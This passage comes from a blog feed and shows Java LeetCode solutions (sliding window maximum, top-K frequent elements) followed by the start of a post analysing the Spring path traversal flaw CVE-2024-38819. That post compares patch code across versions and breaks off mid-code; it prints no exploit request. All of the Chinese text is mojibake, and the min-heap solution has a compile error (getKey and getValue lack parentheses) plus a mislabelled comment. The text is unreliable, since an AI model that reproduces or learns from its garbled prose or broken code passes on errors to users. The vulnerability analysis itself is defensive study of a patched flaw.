æ»‘åŠ¨çª—å£ç§»é™¤æœ€å‰é¢çš„å…ƒç´ ï¼Œç§»é™¤æ—¶åˆ¤æ–­è¯¥å…ƒç´ æ˜¯å¦æ”¾å…¥é˜Ÿåˆ—</span></span><br><span class="line">            myQueue.poll(nums[i - k]);</span><br><span class="line">            <span class="comment">// æ»‘åŠ¨çª—å£åŠ å…¥æœ€åé¢çš„å…ƒç´ </span></span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">            <span class="comment">// è®°å½•æœ€å¤§å€¼</span></span><br><span class="line">            res[num++] = myQueue.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£æ³•äºŒï¼Œåˆ©ç”¨åŒç«¯é˜Ÿåˆ—æ‰‹åŠ¨å®ç°å•è°ƒé˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨ä¸€ä¸ªå•è°ƒé˜Ÿåˆ—æ¥å­˜å‚¨å¯¹åº”çš„ä¸‹æ ‡ï¼Œæ¯å½“çª—å£æ»‘åŠ¨çš„æ—¶å€™ï¼Œç›´æ¥å–é˜Ÿåˆ—çš„å¤´éƒ¨æŒ‡é’ˆå¯¹åº”çš„å€¼æ”¾å…¥ç»“æœé›†å³å¯</span></span><br><span class="line"><span class="comment"> * å•è°ƒé˜Ÿåˆ—ç±»ä¼¼ ï¼ˆtail --&gt;ï¼‰ 3 --&gt; 2 --&gt; 1 --&gt; 0 (--&gt; head) (å³è¾¹ä¸ºå¤´ç»“ç‚¹ï¼Œå…ƒç´ å­˜çš„æ˜¯ä¸‹æ ‡)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        ArrayDeque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="comment">// æ ¹æ®é¢˜æ„ï¼Œiä¸ºnumsä¸‹æ ‡ï¼Œæ˜¯è¦åœ¨[i - k + 1, i] ä¸­é€‰åˆ°æœ€å¤§å€¼ï¼Œåªéœ€è¦ä¿è¯ä¸¤ç‚¹</span></span><br><span class="line">            <span class="comment">// 1.é˜Ÿåˆ—å¤´ç»“ç‚¹éœ€è¦åœ¨[i - k + 1, i]èŒƒå›´å†…ï¼Œä¸ç¬¦åˆåˆ™è¦å¼¹å‡º</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; deque.peek() &lt; i - k + <span class="number">1</span>)&#123;</span><br><span class="line">                deque.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 2.æ—¢ç„¶æ—¶å•è°ƒï¼Œå°±è¦ä¿è¯æ¯æ¬¡æ”¾è¿›å»çš„æ•°å­—éƒ½è¦æ¯”æœ«å°¾çš„å¤§ï¼Œå¦åˆ™ä¹Ÿå¼¹å‡º</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[deque.peekLast()] &lt; nums[i])&#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.offer(i);</span><br><span class="line">            <span class="comment">// å› ä¸ºå•è°ƒï¼Œå½“iå¢é•¿åˆ°ç¬¦åˆç¬¬ä¸€ä¸ªkèŒƒå›´çš„æ—¶å€™ï¼Œæ¯æ»‘åŠ¨ä¸€æ­¥éƒ½å°†é˜Ÿåˆ—å¤´èŠ‚ç‚¹æ”¾å…¥ç»“æœå°±è¡Œäº†</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k - <span class="number">1</span>)&#123;</span><br><span class="line">                res[idx++] = nums[deque.peek()];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="347-å‰-K-ä¸ªé«˜é¢‘å…ƒç´ "><a href="#347-å‰-K-ä¸ªé«˜é¢‘å…ƒç´ " class="headerlink" title="347.å‰ K ä¸ªé«˜é¢‘å…ƒç´ "></a>347.å‰ K ä¸ªé«˜é¢‘å…ƒç´ </h2><p>ç»™å®šä¸€ä¸ªéç©ºçš„æ•´æ•°æ•°ç»„ï¼Œè¿”å›å…¶ä¸­å‡ºç°é¢‘ç‡å‰ k é«˜çš„å…ƒç´ ã€‚</p><p>ç¤ºä¾‹ 1:<br>è¾“å…¥: nums &#x3D; [1,1,1,2,2,3], k &#x3D; 2<br>è¾“å‡º: [1,2]</p><p>ç¤ºä¾‹ 2:<br>è¾“å…¥: nums &#x3D; [1], k &#x3D; 1<br>è¾“å‡º: [1]</p><p>æç¤ºï¼š<br>ä½ å¯ä»¥å‡è®¾ç»™å®šçš„ k æ€»æ˜¯åˆç†çš„ï¼Œä¸” 1 â‰¤ k â‰¤ æ•°ç»„ä¸­ä¸ç›¸åŒçš„å…ƒç´ çš„ä¸ªæ•°ã€‚<br>ä½ çš„ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦å¿…é¡»ä¼˜äº $O(n \log n)$ , n æ˜¯æ•°ç»„çš„å¤§å°ã€‚<br>é¢˜ç›®æ•°æ®ä¿è¯ç­”æ¡ˆå”¯ä¸€ï¼Œæ¢å¥è¯è¯´ï¼Œæ•°ç»„ä¸­å‰ k ä¸ªé«˜é¢‘å…ƒç´ çš„é›†åˆæ˜¯å”¯ä¸€çš„ã€‚<br>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><h3 id="é¢˜è§£-3"><a href="#é¢˜è§£-3" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>é¦–å…ˆç»Ÿè®¡å…ƒç´ å‡ºç°çš„é¢‘ç‡ï¼Œè¿™ä¸€ç±»çš„é—®é¢˜å¯ä»¥ä½¿ç”¨mapæ¥è¿›è¡Œç»Ÿè®¡ã€‚</p><p>ç„¶åæ˜¯å¯¹é¢‘ç‡è¿›è¡Œæ’åºï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ç§ å®¹å™¨é€‚é…å™¨å°±æ˜¯ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚</p><p>ä»€ä¹ˆæ˜¯<strong>ä¼˜å…ˆçº§é˜Ÿåˆ—</strong>å‘¢ï¼Ÿ<br>å…¶å®å°±æ˜¯ä¸€ä¸ªæŠ«ç€é˜Ÿåˆ—å¤–è¡£çš„å †ï¼Œå› ä¸ºä¼˜å…ˆçº§é˜Ÿåˆ—å¯¹å¤–æ¥å£åªæ˜¯ä»é˜Ÿå¤´å–å…ƒç´ ï¼Œä»é˜Ÿå°¾æ·»åŠ å…ƒç´ ï¼Œå†æ— å…¶ä»–å–å…ƒç´ çš„æ–¹å¼ï¼Œçœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ªé˜Ÿåˆ—ã€‚<br>è€Œä¸”ä¼˜å…ˆçº§é˜Ÿåˆ—å†…éƒ¨å…ƒç´ æ˜¯è‡ªåŠ¨ä¾ç…§å…ƒç´ çš„æƒå€¼æ’åˆ—ã€‚é‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•æœ‰åºæ’åˆ—çš„å‘¢ï¼Ÿ<br>ç¼ºçœæƒ…å†µä¸‹priority_queueåˆ©ç”¨max-heapï¼ˆå¤§é¡¶å †ï¼‰å®Œæˆå¯¹å…ƒç´ çš„æ’åºï¼Œè¿™ä¸ªå¤§é¡¶å †æ˜¯ä»¥vectorä¸ºè¡¨ç°å½¢å¼çš„complete binary treeï¼ˆå®Œå…¨äºŒå‰æ ‘ï¼‰ã€‚</p><p>ä»€ä¹ˆæ˜¯å †å‘¢ï¼Ÿ<br>å †æ˜¯ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ï¼Œæ ‘ä¸­æ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½ä¸å°äºï¼ˆæˆ–ä¸å¤§äºï¼‰å…¶å·¦å³å­©å­çš„å€¼ã€‚ å¦‚æœçˆ¶äº²ç»“ç‚¹æ˜¯å¤§äºç­‰äºå·¦å³å­©å­å°±æ˜¯å¤§é¡¶å †ï¼Œå°äºç­‰äºå·¦å³å­©å­å°±æ˜¯å°é¡¶å †ã€‚<br>æ‰€ä»¥å¤§å®¶ç»å¸¸è¯´çš„å¤§é¡¶å †ï¼ˆå †å¤´æ˜¯æœ€å¤§å…ƒç´ ï¼‰ï¼Œå°é¡¶å †ï¼ˆå †å¤´æ˜¯æœ€å°å…ƒç´ ï¼‰ï¼Œå¦‚æœæ‡’å¾—è‡ªå·±å®ç°çš„è¯ï¼Œå°±ç›´æ¥ç”¨priority_queueï¼ˆä¼˜å…ˆçº§é˜Ÿåˆ—ï¼‰å°±å¯ä»¥äº†ï¼Œåº•å±‚å®ç°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»å°åˆ°å¤§æ’å°±æ˜¯å°é¡¶å †ï¼Œä»å¤§åˆ°å°æ’å°±æ˜¯å¤§é¡¶å †ã€‚</p><p>æœ¬é¢˜æˆ‘ä»¬å°±è¦ä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—æ¥å¯¹éƒ¨åˆ†é¢‘ç‡è¿›è¡Œæ’åºã€‚<br>ä¸ºä»€ä¹ˆä¸ç”¨å¿«æ’å‘¢ï¼Œ ä½¿ç”¨å¿«æ’è¦å°†mapè½¬æ¢ä¸ºvectorçš„ç»“æ„ï¼Œç„¶åå¯¹æ•´ä¸ªæ•°ç»„è¿›è¡Œæ’åºï¼Œ è€Œè¿™ç§åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å…¶å®åªéœ€è¦ç»´æŠ¤kä¸ªæœ‰åºçš„åºåˆ—å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯æœ€ä¼˜çš„ã€‚</p><p>æ­¤æ—¶è¦æ€è€ƒä¸€ä¸‹ï¼Œæ˜¯ä½¿ç”¨å°é¡¶å †å‘¢ï¼Œè¿˜æ˜¯å¤§é¡¶å †ï¼Ÿ<br>æœ‰çš„åŒå­¦ä¸€æƒ³ï¼Œé¢˜ç›®è¦æ±‚å‰ K ä¸ªé«˜é¢‘å…ƒç´ ï¼Œé‚£ä¹ˆæœæ–­ç”¨å¤§é¡¶å †å•Šã€‚<br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå®šä¹‰ä¸€ä¸ªå¤§å°ä¸ºkçš„å¤§é¡¶å †ï¼Œåœ¨æ¯æ¬¡ç§»åŠ¨æ›´æ–°å¤§é¡¶å †çš„æ—¶å€™ï¼Œæ¯æ¬¡å¼¹å‡ºéƒ½æŠŠæœ€å¤§çš„å…ƒç´ å¼¹å‡ºå»äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆä¿ç•™ä¸‹æ¥å‰Kä¸ªé«˜é¢‘å…ƒç´ å‘¢ã€‚<br>è€Œä¸”ä½¿ç”¨å¤§é¡¶å †å°±è¦æŠŠæ‰€æœ‰å…ƒç´ éƒ½è¿›è¡Œæ’åºï¼Œé‚£èƒ½ä¸èƒ½åªæ’åºkä¸ªå…ƒç´ å‘¢ï¼Ÿ<br>æ‰€ä»¥æˆ‘ä»¬è¦ç”¨å°é¡¶å †ï¼Œå› ä¸ºè¦ç»Ÿè®¡æœ€å¤§å‰kä¸ªå…ƒç´ ï¼Œåªæœ‰å°é¡¶å †æ¯æ¬¡å°†æœ€å°çš„å…ƒç´ å¼¹å‡ºï¼Œæœ€åå°é¡¶å †é‡Œç§¯ç´¯çš„æ‰æ˜¯å‰kä¸ªæœ€å¤§å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¤§é¡¶å †è§£æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åœ¨ä¼˜å…ˆé˜Ÿåˆ—ä¸­å­˜å‚¨äºŒå…ƒç»„(num, cnt),cntè¡¨ç¤ºå…ƒç´ å€¼numåœ¨æ•°ç»„ä¸­çš„å‡ºç°æ¬¡æ•°</span></span><br><span class="line">        <span class="comment">//å‡ºç°æ¬¡æ•°æŒ‰ä»é˜Ÿå¤´åˆ°é˜Ÿå°¾çš„é¡ºåºæ˜¯ä»å¤§åˆ°å°æ’,å‡ºç°æ¬¡æ•°æœ€å¤šçš„åœ¨é˜Ÿå¤´(ç›¸å½“äºå¤§é¡¶å †)</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1, pair2) -&gt; pair2[<span class="number">1</span>] - pair1[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet())&#123;<span class="comment">// å¤§é¡¶å †éœ€è¦å¯¹æ‰€æœ‰å…ƒç´ è¿›è¡Œæ’åº</span></span><br><span class="line">            pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(), entry.getValue()&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++)&#123; <span class="comment">//ä¾æ¬¡ä»é˜Ÿå¤´å¼¹å‡ºkä¸ªå°±æ˜¯é¢‘ç‡å‰ké«˜çš„</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°é¡¶å †è§£æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åœ¨ä¼˜å…ˆé˜Ÿåˆ—ä¸­å­˜å‚¨äºŒå…ƒç»„(num, cnt),cntè¡¨ç¤ºå…ƒç´ å€¼numåœ¨æ•°ç»„ä¸­çš„å‡ºç°æ¬¡æ•°</span></span><br><span class="line">        <span class="comment">//å‡ºç°æ¬¡æ•°æŒ‰ä»é˜Ÿå¤´åˆ°é˜Ÿå°¾çš„é¡ºåºæ˜¯ä»å¤§åˆ°å°æ’,å‡ºç°æ¬¡æ•°æœ€å¤šçš„åœ¨é˜Ÿå¤´(ç›¸å½“äºå¤§é¡¶å †)</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1, pair2) -&gt; pair1[<span class="number">1</span>] - pair2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet())&#123;<span class="comment">//å°é¡¶å †åªéœ€è¦ç»´æŒkä¸ª</span></span><br><span class="line">            <span class="keyword">if</span>(pq.size() &lt; k)&#123;</span><br><span class="line">                pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(), entry.getValue()&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(entry.getValue() &gt; pq.peek()[<span class="number">1</span>])&#123; <span class="comment">//å½“å‰å…ƒç´ å‡ºç°æ¬¡æ•°å¤§äºå°é¡¶å †çš„æ ¹ç»“ç‚¹(è¿™kä¸ªå…ƒç´ ä¸­å‡ºç°æ¬¡æ•°æœ€å°‘çš„é‚£ä¸ª)</span></span><br><span class="line">                    pq.poll(); <span class="comment">//å¼¹å‡ºé˜Ÿå¤´(å°é¡¶å †çš„æ ¹ç»“ç‚¹),å³æŠŠå †é‡Œå‡ºç°æ¬¡æ•°æœ€å°‘çš„é‚£ä¸ªåˆ é™¤,ç•™ä¸‹çš„å°±æ˜¯å‡ºç°æ¬¡æ•°å¤šçš„äº†</span></span><br><span class="line">                    pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey, entry.getValue&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//ä¾æ¬¡å¼¹å‡ºå°é¡¶å †,å…ˆå¼¹å‡ºçš„æ˜¯å †çš„æ ¹,å‡ºç°æ¬¡æ•°å°‘,åé¢å¼¹å‡ºçš„å‡ºç°æ¬¡æ•°å¤š</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ ˆé‡Œé¢çš„å…ƒç´ åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­åˆ†å¸ƒçš„ä¹ˆï¼Ÿ</p><p>è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ä¸ªé™·é˜±ï¼š<br>é™·é˜±1ï¼šæ ˆæ˜¯å®¹å™¨é€‚é…å™¨ï¼Œåº•å±‚å®¹å™¨ä½¿ç”¨ä¸åŒçš„å®¹å™¨ï¼Œå¯¼è‡´æ ˆå†…æ•°æ®åœ¨å†…å­˜ä¸­ä¸ä¸€å®šæ˜¯è¿ç»­åˆ†å¸ƒçš„ã€‚<br>é™·é˜±2ï¼šç¼ºçœæƒ…å†µä¸‹ï¼Œé»˜è®¤åº•å±‚å®¹å™¨æ˜¯dequeï¼Œé‚£ä¹ˆdequeåœ¨å†…å­˜ä¸­çš„æ•°æ®åˆ†å¸ƒæ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šä¸è¿ç»­çš„ï¼Œä¸‹æ–‡ä¹Ÿä¼šæåˆ°dequeã€‚</p><p>ä¸€ä¸ªé˜Ÿåˆ—åœ¨æ¨¡æ‹Ÿæ ˆå¼¹å‡ºå…ƒç´ çš„æ—¶å€™åªè¦å°†é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ï¼ˆé™¤äº†æœ€åä¸€ä¸ªå…ƒç´ å¤–ï¼‰ é‡æ–°æ·»åŠ åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼Œæ­¤æ—¶åœ¨å»å¼¹å‡ºå…ƒç´ å°±æ˜¯æ ˆçš„é¡ºåºäº†ã€‚</p><h3 id="æ ˆåœ¨ç³»ç»Ÿä¸­çš„åº”ç”¨"><a href="#æ ˆåœ¨ç³»ç»Ÿä¸­çš„åº”ç”¨" class="headerlink" title="æ ˆåœ¨ç³»ç»Ÿä¸­çš„åº”ç”¨"></a>æ ˆåœ¨ç³»ç»Ÿä¸­çš„åº”ç”¨</h3><p>å¦‚æœè¿˜è®°å¾—ç¼–è¯‘åŸç†çš„è¯ï¼Œç¼–è¯‘å™¨åœ¨è¯æ³•åˆ†æçš„è¿‡ç¨‹ä¸­å¤„ç†æ‹¬å·ã€èŠ±æ‹¬å·ç­‰è¿™ä¸ªç¬¦å·çš„é€»è¾‘ï¼Œå°±æ˜¯ä½¿ç”¨äº†æ ˆè¿™ç§æ•°æ®ç»“æ„ã€‚</p><p>å†ä¸¾ä¸ªä¾‹å­ï¼Œlinuxç³»ç»Ÿä¸­ï¼Œcdè¿™ä¸ªè¿›å…¥ç›®å½•çš„å‘½ä»¤æˆ‘ä»¬åº”è¯¥å†ç†Ÿæ‚‰ä¸è¿‡äº†ã€‚<code>cd a/b/c/../../</code><br>è¿™ä¸ªå‘½ä»¤æœ€åè¿›å…¥aç›®å½•ï¼Œç³»ç»Ÿæ˜¯å¦‚ä½•çŸ¥é“è¿›å…¥äº†aç›®å½•å‘¢ ï¼Œè¿™å°±æ˜¯æ ˆçš„åº”ç”¨ã€‚</p><p>é€’å½’çš„å®ç°æ˜¯æ ˆï¼šæ¯ä¸€æ¬¡é€’å½’è°ƒç”¨éƒ½ä¼šæŠŠå‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•°å€¼å’Œè¿”å›åœ°å€ç­‰å‹å…¥è°ƒç”¨æ ˆä¸­ï¼Œç„¶åé€’å½’è¿”å›çš„æ—¶å€™ï¼Œä»æ ˆé¡¶å¼¹å‡ºä¸Šä¸€æ¬¡é€’å½’çš„å„é¡¹å‚æ•°ï¼Œæ‰€ä»¥è¿™å°±æ˜¯é€’å½’ä¸ºä»€ä¹ˆå¯ä»¥è¿”å›ä¸Šä¸€å±‚ä½ç½®çš„åŸå› ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆ </tag>
            
            <tag> é˜Ÿåˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CVEåˆ†æã€‘2024å¹´10æœˆä»½</title>
      <link href="/2024/10/18/WebSecurity/cve/20241018/"/>
      <url>/2024/10/18/WebSecurity/cve/20241018/</url>
      
        <content type="html"><![CDATA[<p>2024å¹´12æœˆ16æ—¥ï¼Œæ”¾å‡ºæ¥äº†pocï¼š<a href="https://mp.weixin.qq.com/s/g64YdLFa_o3GZDic9WfkIQ">https://mp.weixin.qq.com/s/g64YdLFa_o3GZDic9WfkIQ</a></p><h2 id="CVE-2024-38819"><a href="#CVE-2024-38819" class="headerlink" title="CVE-2024-38819"></a>CVE-2024-38819</h2><p><a href="https://spring.io/security/cve-2024-38819">https://spring.io/security/cve-2024-38819</a><br>é€šè¿‡åŠŸèƒ½æ€§ Web æ¡†æ¶ WebMvc.fn æˆ– WebFlux.fn æä¾›é™æ€èµ„æºçš„åº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°è·¯å¾„éå†æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥æ„å»ºæ¶æ„ HTTP è¯·æ±‚ï¼Œå¹¶è·å–æ–‡ä»¶ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¹Ÿå¯ä»¥è¢«è¿è¡Œ Spring åº”ç”¨ç¨‹åºçš„è¿›ç¨‹è®¿é—®ã€‚<br>è¿™ä¸ CVE-2024-38816 ç±»ä¼¼ï¼Œä½†è¾“å…¥ä¸åŒã€‚</p><p>Affected Spring Products and Versions<br>Spring Framework:<br>5.3.0 - 5.3.40<br>6.0.0 - 6.0.24<br>6.1.0 - 6.1.13<br>Older, unsupported versions are also affected</p><p>çœ‹åˆ°6.1.xç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œè€Œ6.1.14ç‰ˆæœ¬ä¸å­˜åœ¨ï¼Œæˆ‘ä¸‹è½½äº†13å’Œ14ä¸¤ä¸ªç‰ˆæœ¬çš„ä»£ç ï¼Œæƒ³è¦é€šè¿‡å¯¹æ¯”æŸ¥çœ‹è¿™ä¸ªæ¼æ´ç‚¹åœ¨å“ªé‡Œ<br>ä½¿ç”¨<strong>WinMerge</strong>å¯¹æ¯”ä»£ç å‘ç°åœ¨ï¼Œwebmvcç›®å½•ä¸‹çš„ä»£ç å­˜åœ¨å¦‚ä¸‹å·®å¼‚ï¼š<br><img src="/2024/10/18/WebSecurity/cve/20241018/image.png"></p><p>æ¥çœ‹ä¸‹å˜æ›´çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 13ç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">path = cleanDuplicateSlashes(path);</span><br><span class="line"><span class="keyword">return</span> cleanLeadingSlash(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 14ç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">path = cleanDuplicateSlashes(path);</span><br><span class="line">path = cleanLeadingSlash(path);</span><br><span class="line"><span class="keyword">return</span> normalizePath(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalizePath</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> path;</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">result = decode(result);</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">result = decode(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;../&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> StringUtils.cleanPath(result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">return</span> URLDecoder.decode(path, 